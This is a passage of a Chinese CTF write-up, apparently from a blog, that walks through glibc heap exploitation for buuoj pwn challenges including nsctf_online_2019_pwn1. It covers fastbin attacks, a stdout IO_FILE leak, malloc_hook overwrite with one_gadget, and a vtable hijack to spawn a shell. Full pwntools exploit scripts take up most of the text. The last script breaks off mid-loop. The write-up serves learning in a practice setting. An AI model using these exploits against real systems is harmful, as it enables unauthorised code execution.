<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)#将大堆块释放，使其进入unsorted bin中</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_a,d_d,d_e)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,<span class="string">&#x27;\x70&#x27;</span>)#将unsorted bin中的堆块篡改到fast bin上</span><br></pre></td></tr></table></figure>

<p>上述代码实现将unsorted bin中的堆块放入fast bin中。</p>
<p>下图为修改前的bins情况<br><img src="/../img/2706180-20220826111157348-1189507279.png"></p>
<p>下图为修改后的bins情况</p>
<p><img src="/../img/2706180-20220826111208472-424079904.png"></p>
<h4 id="爆破一比特位，将fake-chunk申请到stdout结构体上方"><a href="#爆破一比特位，将fake-chunk申请到stdout结构体上方" class="headerlink" title="爆破一比特位，将fake_chunk申请到stdout结构体上方"></a>爆破一比特位，将fake_chunk申请到stdout结构体上方</h4><p>由于我们的fake_chunk进入了fast bin中，但是其size是之前被伪造过的0xe1，要想从fastbin中再申请出来还需要再改回去。同时需要打fastbin attack将fake_chunk申请到stdout结构体上方，这个地址是在&amp;_IO_2_1_stdout_-0x43的位置，因为我们需要一个地址是0x7f开头，同时下一个内存单元为0的地址。</p>
<p>如下图这里就是符合条件的地方：</p>
<p><img src="/../img/2706180-20220826111255470-1590182798.png"></p>
<p>经过计算发现该stdout结构体地址-0x43的位置成功伪造了size</p>
<p><img src="/../img/2706180-20220826111308632-2123238392.png"></p>
<p>而这个地址的后三位是固定的，倒数第四位是随机的 ，但是我们只能写两字节因此第四位必须要去爆破。(在调试的时候关闭ASLR就无需爆破了，等脚本写完了再去写爆破部分)</p>
<p>然后fake_chunk申请到stdout结构体上方后，我们去改变结构体的_flags字段和_IO_write_base字段(具体原理的话可以看这篇<a target="_blank" rel="noopener" href="https://www.cnblogs.com/pwnfeifei/p/15793432.html">文章</a>)，等再次调用puts函数的时候，我们就可以获取libc基地址了（需要注意的是将_flags字段改成0xfbad1880，之后的puts都不会再加\n了，因此要处理一下接收部分。不过用0xfbad1887就是正常的）。</p>
<p>这部分exp中的代码如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+<span class="string">b&#x27;\xdd\x25&#x27;</span>)<span class="comment">#伪造0x71的size，使其通过fast bin的检查,伪造fake chunk到stdout结构体上方(需要爆破一位)</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">9</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#将fastbin中的堆块申请出去，打fastbin attack</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">11</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)<span class="comment">#篡改结构体中的字段</span></span><br><span class="line">leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>



<h4 id="劫持malloc-hook"><a href="#劫持malloc-hook" class="headerlink" title="劫持malloc_hook"></a>劫持malloc_hook</h4><p>有了libc基地址，还可以打fastbin attack的话，那就是一个常规的劫持malloc_hook了，就利用malloc_hook-0x23那个位置存在的0x7f来伪造成size将malloc_hook申请出来，然后这道题的话one_gadget也都不通，需要用realloc函数来调整一下栈帧。</p>
<p>这部分exp如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>) </span><br><span class="line">delete(<span class="number">10</span>,<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">10</span>,p64(malloc_hook-<span class="number">0x23</span>),<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">12</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">13</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(one_gadget)+p64(realloc+<span class="number">6</span>),<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;wlecome input your size of weapon: &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x60</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(<span class="number">14</span>))</span><br></pre></td></tr></table></figure>



<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><p>由于这道题需要爆破一比特位，因此我们最终还有再加一个爆破部分。最终的exp如下：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28187)</span></span><br><span class="line">d_a=<span class="number">0xEAE</span></span><br><span class="line">d_d=<span class="number">0xec0</span></span><br><span class="line">d_e=<span class="number">0xed2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,index,content,choice=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; \n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;wlecome input your size of weapon: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;input your name:\n&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;input your name:&#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content,choice=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; \n&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input idx: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;new content:\n&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;new content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index,choice=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; \n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input idx :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">8</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">7</span>,<span class="string">&#x27;prevent_chunk&#x27;</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;\x50&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xe1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)<span class="comment">#将大堆块释放，使其进入unsorted bin中</span></span><br><span class="line">    </span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    edit(<span class="number">8</span>,<span class="string">&#x27;\x70&#x27;</span>)<span class="comment">#将unsorted bin中的堆块篡改到fast bin上</span></span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+<span class="string">b&#x27;\xdd\x25&#x27;</span>)<span class="comment">#伪造0x71的size，使其通过fast bin的检查,伪造fake chunk到stdout结构体上方(需要爆破一位)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">9</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#将fastbin中的堆块申请出去，打fastbin attack</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">11</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3c5600</span></span><br><span class="line">    malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    one_gadget=libc_base+search_og(<span class="number">1</span>)</span><br><span class="line">    realloc=libc_base+libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">    log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>) </span><br><span class="line">    delete(<span class="number">10</span>,<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">10</span>,p64(malloc_hook-<span class="number">0x23</span>),<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">12</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">13</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(one_gadget)+p64(realloc+<span class="number">6</span>),<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;wlecome input your size of weapon: &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x60</span>))</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,d_a,d_d,d_e)</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(<span class="number">14</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29923</span>)</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220826111332346-148506803.png"></p>
<h2 id="nsctf-online-2019-pwn1"><a href="#nsctf-online-2019-pwn1" class="headerlink" title="nsctf_online_2019_pwn1"></a>nsctf_online_2019_pwn1</h2><p>通过这道题的学习与总结有：</p>
<p>1、篡改_IO_FILE结构体中的vtable字段时，要不可避免的填充之前的字段，但如果将_lock字段破坏的话，在执行输出函数中最开始上锁的宏<code>_IO_acquire_lock (_IO_stdout)</code>就会崩溃掉，因此需要保证_lock字段是正常的。</p>
<p>2、如果想通过直接修改_IO_2_1_stdout_结构体中的字段来获取shell的话，我们可以将_flags字段写入字符串&#x2F;bin&#x2F;sh\x00(是字符串，并非该字符串的地址)，然后将vtable修改为_IO_2_1_stdout_的地址+0x10，然后将_IO_save_base字段写成system地址，最后要将_lock字段写入原本正常的值。这样当执行puts函数的时候会调用vtable中的_IO_new_file_xsputn函数，但是vtable已经被修改，这个函数的偏移是0x38,而vtable被修改成_IO_2_1_stdout_的地址+0x10,最终调用的是_IO_2_1_stdout_的地址+0x48的函数指针，而这个位置就是_IO_save_base字段，里面放的是system的地址。而_IO_new_file_xsputn函数的第一个参数是_IO_2_1_stdout_的地址，而这个地址原本应该是_flags字段，但是现在却被写入了&#x2F;bin&#x2F;sh字符串。因此本来正常调用的_IO_new_file_xsputn函数如今变成了system(‘&#x2F;bin&#x2F;sh\x00’),从而获取shell。(该方法只能在libc2.23以上的版本就无法再使用了)</p>
<p>3、<strong>只有off by null漏洞的话，想需要将unsorted bin中的fd放到fastbin的fd上，需要打两次off by null+堆块重叠，并且最后将其申请出来之前，需要篡改一下size的大小。</strong></p>
<h3 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/2706180-20220826111350808-1322092443.png"></p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析:"></a>漏洞分析:</h3><p>首先在edit函数中，输入索引的部分，检查不完全，导致了这个索引是可以为负溢出的。</p>
<p><img src="/../img/2706180-20220826111401744-135014955.png"></p>
<p>然后在edit函数写入数据的地方，如果add创建时的大小等于edit时输入的大小，那么就有一个off by null漏洞。</p>
<p><img src="/../img/2706180-20220826111445836-811184644.png"></p>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><h4 id="思路一：利用索引为负，溢出漏洞"><a href="#思路一：利用索引为负，溢出漏洞" class="headerlink" title="思路一：利用索引为负，溢出漏洞"></a>思路一：利用索引为负，溢出漏洞</h4><p><img src="/../img/2706180-20220826111507589-1206383168.png"></p>
<p>我们发现数组的索引为负数，是可以找到bss段存放的stdout指针，而这个指针存放的是_IO_2_1_stdout_结构体指针，如果read往里面写数据的话，就可以直接篡改_IO_2_1_stdout_结构体的各个字段。</p>
<p>通过这个方式，我们可以打一个io leak，泄露libc地址，然后再篡改_flags、_lock、vtable、_IO_save_base字段，最终劫持vtable中的_IO_new_file_xsputn函数为system函数，执行获取shell。</p>
<p>这次跟着<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/15229822.html">roderick师傅的博客</a>学到了这个FileStructure()的用法，感觉蛮方便的。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27580</span>)</span><br><span class="line">d_a=<span class="number">0xF1B</span></span><br><span class="line">d_d=<span class="number">0xF27</span></span><br><span class="line">d_e=<span class="number">0xF3f</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the content:\n&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Add success\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Input new content:\n&#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Delete success\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">payload=p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>//改成<span class="number">0xfbad1887</span>的话,puts函数打印出来的数据后面依然有\n</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a,d_e,0xe34)</span></span><br><span class="line">edit(-<span class="number">0x10</span>,<span class="number">0xf0</span>,payload)</span><br><span class="line">leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3c36e0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">file=FileStructure()</span><br><span class="line">file.flags=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">file.vtable=libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]+<span class="number">0x10</span></span><br><span class="line">file._IO_save_base=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">file._lock=libc_base+<span class="number">0x3c6780</span><span class="comment">#确保这个_lock字段的值是正常的</span></span><br><span class="line">edit(-<span class="number">0x10</span>,<span class="number">0xf0</span>,<span class="built_in">bytes</span>(file))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220826112921840-1751167110.png"></p>
<h4 id="思路二：利用off-by-null"><a href="#思路二：利用off-by-null" class="headerlink" title="思路二：利用off_by_null"></a>思路二：利用off_by_null</h4><p>这个思路比较常规，也比较麻烦。</p>
<p>主要是通过两次off by null造成两次堆块重叠，然后将unsorted bin中的fd指针写入fastbin中的fd位置。然后打fastbin attack进行io leak。最后再打fastbin attack往malloc_hook中写入one_gadget。</p>
<p>整体来说最麻烦的部分就是将unsorted bin中的fd指针写入fastbin中的fd位置。</p>
<p>这里的具体过程如下：</p>
<blockquote>
<p><strong>利用off by one(null)先打一个堆块重叠，然后在bss段上留下两个spy chunk的地址</strong>，将其中一个释放掉进入fast bin中，那么此时bss段上还有一个spy chunk的地址。但此时的unsorted bin的地址已经低于了spy chunk的地址，那就将unsorted bin中的堆块都申请回来。然后再次利用off by one(null)做一个堆块重叠，这次<strong>将merged chunk申请回来后，unsorted bin的fd指针就自然落到了spy chunk的fd指针上(别忘了此时这个堆块也位于fastbin中)，这样unsorted bin中的fd指针就落到了fast bin中</strong>，同时bss段上仍然存在一个spy chunk的地址，这样编辑该堆块就可以控制unsorted bin中的fd指针，此时的size是unsorted bin范围里的大size(无法直接将其申请出来)，此时我们应该去将merged chunk释放掉，然后unsorted bin向上合并(向低地址合并)，而原本spy chunk的fd并不会消失，然后再次申请一个len(merged chunk)+0x10+2 大小的chunk，这样往这个新chunk写入数据的时候，就可以控制spy chunk的size，顺便还能把spy chunk的fd(也就是main_arena+88)的后两字节给修改到stdout结构体上方。</p>
</blockquote>
<h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP:"></a>EXP:</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d_a=<span class="number">0xF1B</span></span><br><span class="line">d_d=<span class="number">0xF27</span></span><br><span class="line">d_e=<span class="number">0xF3f</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content,choice=<span class="number">1</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;Input the content:\n&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;Input the content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content,choice=<span class="number">1</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;Input new content:\n&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;Input new content:&#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Delete success\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0xf0</span>,<span class="string">&#x27;c&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;d&#x27;</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">2</span>)<span class="comment">#merge succeeded</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0xf0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#add(0x100,&#x27;a&#x27;)</span></span><br><span class="line"> </span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">2</span>,<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x70</span>+<span class="number">0x90</span>))</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a,d_e,0xB64)   </span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add((<span class="number">0x80</span>+<span class="number">0x10</span>+<span class="number">2</span>),p64(<span class="number">0</span>)*<span class="number">17</span>+p64(<span class="number">0x71</span>)+<span class="string">b&#x27;\xdd\x25&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x59</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x60&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">    leak_libc=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3c56a4</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    one_gadget=search_og(<span class="number">3</span>)+libc_base</span><br><span class="line">    log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">2</span>,<span class="number">0x68</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x13</span>+p64(one_gadget))</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the size:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x60</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29269</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        